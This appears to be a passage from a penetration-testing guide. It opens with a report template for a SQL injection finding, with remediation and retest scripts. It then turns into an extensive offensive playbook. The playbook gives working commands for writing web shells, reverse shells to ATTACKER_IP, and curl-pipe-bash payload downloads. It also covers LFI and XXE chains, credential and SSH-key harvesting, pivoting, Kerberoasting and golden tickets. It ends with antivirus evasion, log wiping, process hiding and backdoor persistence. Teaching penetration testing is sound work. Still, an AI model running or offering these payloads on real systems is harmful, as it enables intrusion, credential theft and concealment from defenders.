- NIST SP 800-115
```

**Technical findings section:**

````markdown
## Detailed Findings

### VULN-001: SQL Injection in User API [CRITICAL]

**CVSS Score:** 9.8 (Critical)
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

#### Description
The /api/user endpoint contains a SQL injection vulnerability in the user_id parameter. Attackers can execute arbitrary SQL queries without authentication.

#### Location
- **URL:** https://app.target.com/api/user
- **Parameter:** user_id (GET)
- **Component:** User Management API v2.1

#### Steps to Reproduce
1. Navigate to https://app.target.com/api/user?user_id=1
2. Modify parameter to: `user_id=1' UNION SELECT username,password,email FROM users--`
3. Observe database contents in response

#### Proof of Concept
```http
GET /api/user?user_id=1' UNION SELECT username,password,email FROM users-- HTTP/1.1
Host: app.target.com
User-Agent: Mozilla/5.0
````

Response returns complete user table including password hashes.

#### Impact

- **Confidentiality:** HIGH - Complete database extraction possible
- **Integrity:** HIGH - Data modification/deletion possible
- **Availability:** HIGH - Database can be dropped

**Business Impact:**

- 100,000+ user records exposed
- Admin credentials compromised
- GDPR Article 33 breach notification required
- Estimated fine: €20M or 4% annual turnover

#### Affected Assets

- Production: https://app.target.com
- Staging: https://staging.target.com (also vulnerable)

#### Remediation

**Immediate (Day 1):**

1. Deploy WAF rule to block SQL injection patterns
2. Disable vulnerable endpoint if not critical

**Short-term (Week 1):**

1. Implement parameterized queries:

```python
# Vulnerable code:
cursor.execute("SELECT * FROM users WHERE id = " + user_id)

# Secure code:
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

2. Input validation:

```python
if not user_id.isdigit():
    return error("Invalid user_id")
```

3. Apply principle of least privilege to database account

**Long-term:**

- Implement prepared statements throughout application
- Deploy database activity monitoring
- Regular security code review
- Automated SAST/DAST in CI/CD pipeline

#### References

- CWE-89: SQL Injection
- OWASP A03:2021 - Injection
- CAPEC-66: SQL Injection

#### Evidence

- [Appendix A] Screenshot of successful exploitation
- [Appendix B] Extracted database records
- [Appendix C] Video demonstration

````

**Remediation tracking template:**
```markdown
## Remediation Tracker

| ID | Vulnerability | Severity | Status | Assigned To | Due Date | Verified |
|----|---------------|----------|--------|-------------|----------|----------|
| VULN-001 | SQL Injection | Critical | In Progress | Dev Team | 2025-10-25 | No |
| VULN-002 | RCE via Upload | Critical | Open | Dev Team | 2025-10-25 | No |
| VULN-003 | Stored XSS | High | Fixed | Dev Team | 2025-10-30 | Yes |
| VULN-004 | IDOR | High | Open | API Team | 2025-11-01 | No |

**Status Definitions:**
- **Open**: Not yet addressed
- **In Progress**: Actively being remediated
- **Fixed**: Patch deployed to production
- **Verified**: Fix confirmed by security team
- **Accepted**: Risk accepted, no fix planned
````

### Post-Assessment Activities

**Retesting workflow:**

```bash
# After remediation, verify fixes
# Create retest script

#!/bin/bash
# retest_vulns.sh

echo "[*] Retesting VULN-001: SQL Injection"
response=$(curl -s "https://app.target.com/api/user?user_id=1' OR '1'='1")
if echo "$response" | grep -q "SQL syntax\|mysql"; then
    echo "[-] VULN-001: Still vulnerable"
else
    echo "[+] VULN-001: Appears fixed"
fi

echo "[*] Retesting VULN-002: File Upload RCE"
# Test file upload with PHP payload
# Should be blocked

echo "[*] Retesting VULN-003: XSS"
response=$(curl -s "https://app.target.com/comment" \
  -d "text=<script>alert(1)</script>")
if echo "$response" | grep -q "<script>alert(1)</script>"; then
    echo "[-] VULN-003: Still vulnerable"
else
    echo "[+] VULN-003: Appears fixed"
fi
```

**Metrics and KPIs:**

```markdown
## Assessment Metrics

### Coverage
- **Assets Tested:** 8/10 (80%)
- **Endpoints Tested:** 156
- **Parameters Tested:** 432
- **Test Cases Executed:** 2,847

### Vulnerability Discovery
- **Total Findings:** 15
- **True Positives:** 13 (87%)
- **False Positives:** 2 (13%)
- **Average CVSS:** 6.8

### Time Breakdown
- **Reconnaissance:** 16 hours (20%)
- **Vulnerability Scanning:** 20 hours (25%)
- **Manual Testing:** 32 hours (40%)
- **Reporting:** 12 hours (15%)

### Remediation Tracking
- **Avg Time to Fix (Critical):** 3 days
- **Avg Time to Fix (High):** 14 days
- **Avg Time to Fix (Medium):** 45 days
- **Fix Verification Rate:** 92%
```

**Continuous monitoring setup:**

```bash
# Set up ongoing vulnerability monitoring

# 1. Automated scanning cron job
cat << 'EOF' > /etc/cron.d/security_scan
0 2 * * 0 /opt/security/weekly_scan.sh
0 3 * * * /opt/security/daily_check.sh
EOF

# 2. weekly_scan.sh
#!/bin/bash
TARGETS="/opt/security/targets.txt"
DATE=$(date +%Y%m%d)

nuclei -l $TARGETS -t ~/nuclei-templates/ -severity critical,high \
  -o "/opt/security/reports/nuclei_$DATE.txt"

# Compare with baseline
diff /opt/security/baseline.txt "/opt/security/reports/nuclei_$DATE.txt" \
  > "/opt/security/reports/new_findings_$DATE.txt"

# Alert if new findings
if [ -s "/opt/security/reports/new_findings_$DATE.txt" ]; then
    mail -s "New Vulnerabilities Detected" security@company.com \
      < "/opt/security/reports/new_findings_$DATE.txt"
fi

# 3. Monitor for new subdomains
#!/bin/bash
# subdomain_monitor.sh
DOMAIN="target.com"
OLD_SUBS="/opt/security/subdomains_old.txt"
NEW_SUBS="/opt/security/subdomains_new.txt"

subfinder -d $DOMAIN -o $NEW_SUBS -silent

if [ -f $OLD_SUBS ]; then
    comm -13 <(sort $OLD_SUBS) <(sort $NEW_SUBS) > new_assets.txt
    
    if [ -s new_assets.txt ]; then
        echo "New assets discovered:" | \
          mail -s "New Assets Alert" security@company.com \
          -A new_assets.txt
    fi
fi

cp $NEW_SUBS $OLD_SUBS
```

---

**Related Subtopics**

For comprehensive real-world security integration, also study:

- **Compliance Frameworks** - PCI DSS, GDPR, HIPAA, SOC 2 requirements
- **Threat Modeling** - STRIDE, PASTA, attack tree analysis
- **Incident Response** - Detection, containment, eradication, recovery procedures
- **Security Metrics** - KPIs, dashboards, trend analysis for security programs

---

## Exploit Chaining

### Methodology

**Chain Components:**
1. **Initial Access** → 2. **Privilege Escalation** → 3. **Lateral Movement** → 4. **Objective Achievement**

Each stage leverages previous foothold to advance attack progression.

### Web to System Shell Chain

**Stage 1: SQL Injection → File Write**
```sql
-- Identify writable directories
SELECT @@datadir;
SELECT @@secure_file_priv;

-- Write web shell via SQL injection
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- -

-- Alternative: INTO DUMPFILE for binary files
' UNION SELECT 0xHEX_PAYLOAD INTO DUMPFILE '/var/www/html/shell.php' -- -
```

**Stage 2: Web Shell → Reverse Shell**
```bash
# Access web shell
curl "http://target/shell.php?cmd=which+nc"

# Establish reverse shell
# URL encode and execute:
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Alternative payloads if restrictions exist:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Stage 3: Shell Stabilization**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Stage 4: Enumeration for Privilege Escalation**
```bash
# Quick wins check
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null

# Upload enumeration script
wget http://ATTACKER_IP/linpeas.sh -O /tmp/lp.sh
chmod +x /tmp/lp.sh
./tmp/lp.sh
```

**Stage 5: Privilege Escalation Execution**
```bash
# Example: Exploiting sudo permissions
# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/vim

sudo vim -c ':!/bin/bash'
# Now root shell
```

### LFI to RCE Chain

**Stage 1: Local File Inclusion Discovery**
```bash
# Test for LFI
http://target/index.php?page=../../../etc/passwd

# Identify PHP version and configuration
http://target/index.php?page=../../../etc/php/7.4/apache2/php.ini
```

**Stage 2: Log Poisoning**
```bash
# Poison Apache access logs
nc target 80
<?php system($_GET['cmd']); ?>

# Include poisoned log
http://target/index.php?page=../../../var/log/apache2/access.log&cmd=id

# Alternative: SSH log poisoning
ssh '<?php system($_GET["cmd"]); ?>'@target
http://target/index.php?page=../../../var/log/auth.log&cmd=id
```

**Stage 3: PHP Session Poisoning**
```bash
# Set session variable with payload
curl -X POST http://target/profile.php -d "name=<?php system(\$_GET['cmd']); ?>" -b "PHPSESSID=YOUR_SESSION_ID"

# Include session file
http://target/index.php?page=../../../var/lib/php/sessions/sess_YOUR_SESSION_ID&cmd=whoami
```

**Stage 4: PHP Filter Chain for RCE**
```bash
# Generate payload using php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'

# Use generated filter chain
http://target/index.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|[LONG_CHAIN]|resource=data://,<?php system($_GET[0]); ?>&0=id
```

### File Upload to Shell Chain

**Stage 1: Upload Bypass Techniques**
```bash
# Extension manipulation
shell.php.jpg
shell.php%00.jpg  # Null byte (PHP < 5.3)
shell.php%0a.jpg  # Newline
shell.pHP
shell.php5
shell.phtml
shell.phar

# MIME type manipulation
Content-Type: image/jpeg
[while uploading PHP file]

# Magic bytes prepending
GIF89a;
<?php system($_GET['cmd']); ?>

# Polyglot file (valid image + PHP)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg
```

**Stage 2: Path Traversal in Upload**
```bash
# Manipulate filename to write outside upload directory
filename: ../../shell.php
filename: ....//....//shell.php
```

**Stage 3: .htaccess Upload**
```apache
# Upload .htaccess to make images execute as PHP
AddType application/x-httpd-php .jpg

# Or specific handler
<FilesMatch "shell.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>
```

**Stage 4: Access Uploaded Shell**
```bash
# Access via predictable paths
http://target/uploads/shell.php?cmd=whoami
http://target/files/[DATE]/shell.php?cmd=id

# If path obfuscated, leak via:
- Error messages
- Response headers
- Timing attacks
- Forced browsing
```

### XXE to SSRF to RCE Chain

**Stage 1: XXE Exploitation**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**Stage 2: XXE to SSRF**
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<data>&xxe;</data>

# Access internal services
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

**Stage 3: SSRF to Internal Service Exploitation**
```xml
# Gopher protocol for POST requests
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_
*1%0d%0a$8%0d%0aFLUSHALL%0d%0a
*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
<?php system($_GET['cmd']); ?>
%0d%0a
*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a
*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a
*1%0d%0a$4%0d%0aSAVE%0d%0a
">
```

---

## Multi-Stage Attacks

### Reconnaissance → Exploitation → Pivoting

**Stage 1: External Reconnaissance**
```bash
# Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -d target.com

# Port scanning
nmap -sC -sV -oA nmap_results target.com
masscan -p1-65535 target.com --rate=10000

# Technology fingerprinting
whatweb target.com
wappalyzer target.com

# Content discovery
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://target.com/FUZZ
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

**Stage 2: Initial Foothold via Web Application**
```bash
# Identify vulnerability (example: command injection)
# Parameter: http://target.com/ping.php?ip=127.0.0.1

# Test injection
curl "http://target.com/ping.php?ip=127.0.0.1;id"

# Establish foothold
curl "http://target.com/ping.php?ip=127.0.0.1;curl+http://ATTACKER_IP/shell.sh|bash"
```

**Stage 3: Local Enumeration**
```bash
# Network mapping
ip a
ip route
cat /etc/hosts
cat /etc/resolv.conf

# Identify dual-homed hosts
ifconfig | grep inet

# Running services
netstat -tulpn
ss -tulpn

# Other users
w
last
cat /etc/passwd
```

**Stage 4: Credential Harvesting**
```bash
# Search for credentials
grep -r "password" /var/www/ 2>/dev/null
grep -r "pass" /opt/ 2>/dev/null
find / -name "*config*" -type f 2>/dev/null

# Database credentials
cat /var/www/html/config.php
cat /var/www/html/wp-config.php

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/known_hosts
```

**Stage 5: Privilege Escalation**
```bash
# Upload and run automated tools
curl http://ATTACKER_IP/linpeas.sh | sh

# Exploit identified vector
# Example: writable systemd service
echo '[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1"
' > /etc/systemd/system/vulnerable.service

systemctl daemon-reload
systemctl restart vulnerable
```

**Stage 6: Lateral Movement Setup**
```bash
# Setup pivot using SSH
ssh -L 8080:INTERNAL_IP:80 -N -f user@compromised_host

# Or reverse SSH tunnel
ssh -R 9090:localhost:22 user@ATTACKER_IP

# Using chisel
# On attacker:
./chisel server -p 8000 --reverse

# On compromised host:
./chisel client ATTACKER_IP:8000 R:socks
```

**Stage 7: Internal Network Exploitation**
```bash
# Port scan through pivot
proxychains nmap -sT -Pn INTERNAL_IP

# Exploit internal services
proxychains msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST INTERNAL_TARGET
set LHOST PIVOT_HOST
exploit
```

### Defense Evasion Techniques in Chain

**Anti-Virus Evasion:**
```bash
# Encode payloads
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -e x86/shikata_ga_nai -i 5 -o payload

# Obfuscate bash scripts
bash -c "$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE= | base64 -d)"

# Use living-off-the-land binaries
curl http://ATTACKER_IP/payload.sh | bash
wget -O - http://ATTACKER_IP/payload.sh | sh
```

**Log Manipulation:**
```bash
# Clear specific entries
sed -i '/ATTACKER_IP/d' /var/log/auth.log

# Disable logging temporarily
service rsyslog stop
service auditd stop

# Symlink logs to /dev/null
ln -sf /dev/null /var/log/auth.log
```

**Process Hiding:**
```bash
# Rename process
exec -a "[kworker/0:1]" ./backdoor

# LD_PRELOAD hiding (requires root)
# Use tools like libprocesshider
```

---

## End-to-End Exploitation Scenarios

### Scenario 1: Corporate Web Application to Domain Admin

**Target Environment:**
- External web application
- Internal network with Active Directory
- Database server
- File server

**Attack Flow:**

**1. Initial Access: SQL Injection**
```sql
-- Enumerate database
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -

-- Extract credentials
' UNION SELECT NULL,username,password FROM users-- -

-- Check privileges
' UNION SELECT NULL,user(),current_user()-- -

-- File write capability
' UNION SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/s.php'-- -
```

**2. Web Shell to Reverse Shell**
```bash
# Access: http://target/s.php?0=curl+ATTACKER_IP/r.sh|bash

# r.sh contains:
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**3. Post-Exploitation Enumeration**
```bash
# Stabilize shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# System information
hostname
uname -a
cat /etc/issue

# Database credentials
cat /var/www/html/config.php

# MySQL access
mysql -u dbuser -p'password' -e "SELECT user,authentication_string FROM mysql.user;"
```

**4. Privilege Escalation**
```bash
# Upload and run LinPEAS
curl http://ATTACKER_IP/linpeas.sh -o /tmp/l.sh
bash /tmp/l.sh

# Exploit finding: Docker group membership
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Now root on host
```

**5. Pivot to Internal Network**
```bash
# Identify network segments
ip a
ip route

# Setup SOCKS proxy
# Upload chisel binary
curl http://ATTACKER_IP/chisel -o /tmp/chisel
chmod +x /tmp/chisel

# On attacker:
./chisel server -p 8000 --reverse

# On compromised host:
/tmp/chisel client ATTACKER_IP:8000 R:socks
```

**6. Internal Network Reconnaissance**
```bash
# Through SOCKS proxy
proxychains nmap -sT -Pn -p 445,3389,5985 10.10.10.0/24

# Identify Domain Controller
proxychains nmap -sT -Pn -p 88,389,636 10.10.10.0/24
```

**7. Credential Access via Database**
```bash
# Extract AD user passwords from application database
mysql -u dbuser -p'password' webapp_db -e "SELECT username,password FROM ad_users;"

# Crack hashes offline
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**8. Lateral Movement to Windows Host**
```bash
# Using crackmapexec through proxy
proxychains crackmapexec smb 10.10.10.0/24 -u user -p 'password' --shares

# PSExec-style execution
proxychains crackmapexec smb 10.10.10.50 -u user -p 'password' -x 'whoami'

# Or use evil-winrm if WinRM enabled
proxychains evil-winrm -i 10.10.10.50 -u user -p 'password'
```

**9. Domain Enumeration**
```powershell
# From Windows host
Import-Module ActiveDirectory

# Enumerate users
Get-ADUser -Filter * -Properties *

# Enumerate groups
Get-ADGroup -Filter * -Properties *

# Domain Admins
Get-ADGroupMember "Domain Admins"

# Enumerate computers
Get-ADComputer -Filter * -Properties *
```

**10. Kerberoasting**
```powershell
# Request TGS for service accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Using Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Transfer hashes to attacker, crack offline
hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**11. Domain Admin Access**
```powershell
# With cracked service account credentials
# PSExec to Domain Controller
proxychains psexec.py DOMAIN/serviceaccount:'password'@DC_IP

# Dump credentials
secretsdump.py DOMAIN/serviceaccount:'password'@DC_IP

# Extract NTLM hashes for domain admin
```

**12. Persistence**
```powershell
# Golden Ticket (requires krbtgt hash)
# From secretsdump output
.\mimikatz.exe
kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-DOMAIN-SID /krbtgt:HASH /ptt

# Add backdoor account
net user backdoor P@ssw0rd123 /add /domain
net group "Domain Admins" backdoor /add /domain
```

### Scenario 2: IoT Device to Network Compromise

**Attack Flow:**

**1. Device Discovery**
```bash
# Shodan reconnaissance
shodan search "default password" country:US

# Local network scan
nmap -sn 192.168.1.0/24
nmap -p- -T4 192.168.1.0/24
```

**2. Default Credentials**
```bash
# Common IoT credentials
admin:admin
root:root
admin:password
admin:12345

# Test access
curl -u admin:admin http://192.168.1.50/cgi-bin/status
ssh admin@192.168.1.50
telnet 192.168.1.50
```

**3. Firmware Extraction**
```bash
# Download firmware
wget http://vendor.com/firmware/device_v1.2.bin

# Extract filesystem
binwalk -e device_v1.2.bin
cd _device_v1.2.bin.extracted/squashfs-root

# Search for hardcoded credentials
grep -r "password" .
grep -r "admin" ./etc/
cat etc/shadow
```

**4. Exploitation via Web Interface**
```bash
# Command injection in CGI scripts
curl "http://192.168.1.50/cgi-bin/ping.cgi?ip=127.0.0.1;curl+http://ATTACKER_IP/payload.sh|sh"

# Buffer overflow in binary (if applicable)
# Generate payload with msfvenom targeting architecture
msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f python
```

**5. Establish Persistence**
```bash
# Modify startup scripts
echo "telnetd -l /bin/sh -p 9999" >> /etc/init.d/rcS

# Add cron job
echo "*/10 * * * * /tmp/.backdoor.sh" >> /etc/crontabs/root

# Modify web interface for backdoor
echo '<?php if($_GET["k"]=="secret") system($_GET["c"]); ?>' >> /var/www/admin.php
```

**6. Network Pivoting**
```bash
# Device has access to management VLAN
# Setup port forwarding
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

# Or SSH tunnel if available
ssh -L 8080:10.0.0.1:80 -N -f root@192.168.1.50
```

### Key Integration Principles

1. **Information Gathering at Each Stage**: Every successful exploitation reveals new attack surface
2. **Credential Reuse**: Test discovered credentials across all services
3. **Maintain Multiple Footholds**: Establish backup access methods
4. **Document Everything**: Keep detailed notes of credentials, IPs, and exploitation paths
5. **Adapt to Environment**: Modify techniques based on defenses encountered

---

**Related Topics:** Red team operations, penetration testing methodology, adversary emulation, Active Directory attacks, network segmentation bypass, container/cloud exploitation